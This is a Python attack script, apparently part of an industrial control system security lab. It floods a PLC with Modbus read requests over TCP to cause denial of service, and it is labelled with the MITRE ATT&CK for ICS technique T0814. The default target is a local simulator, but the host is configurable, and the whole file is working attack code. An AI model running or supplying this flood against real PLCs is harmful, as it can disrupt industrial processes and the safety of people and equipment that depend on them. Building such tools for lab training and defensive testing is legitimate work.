"""Modbus flooding: denial of service against the PLC.

Sends a high volume of read requests to overwhelm the PLC, simulating
a network-based DoS attack against an ICS device.

MITRE ATT&CK for ICS: T0814 (Denial of Service)

Usage:
    python scripts/flood.py [--host 127.0.0.1] [--port 5020] [--duration 10]
"""

from __future__ import annotations

import argparse
import socket
import sys
import time

sys.path.insert(0, ".")
from forge.protocol.modbus import read_input_registers


def main() -> None:
    parser = argparse.ArgumentParser(description="Modbus DoS: flood PLC with requests")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5020)
    parser.add_argument("--duration", type=int, default=10, help="Seconds to flood")
    args = parser.parse_args()

    print(f"[*] Flooding {args.host}:{args.port} for {args.duration}s")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((args.host, args.port))
    sock.settimeout(0.5)

    start = time.time()
    tid = 0
    sent = 0
    errors = 0

    while time.time() - start < args.duration:
        tid = (tid + 1) & 0xFFFF
        try:
            sock.sendall(read_input_registers(tid, 1, 0, 5))
            sent += 1
            try:
                sock.recv(256)
            except socket.timeout:
                errors += 1
        except (BrokenPipeError, OSError):
            errors += 1
            break

    elapsed = time.time() - start
    print(f"[+] Sent {sent} requests in {elapsed:.1f}s ({sent / elapsed:.0f} req/s)")
    print(f"[+] Errors: {errors}")
    sock.close()


if __name__ == "__main__":
    main()
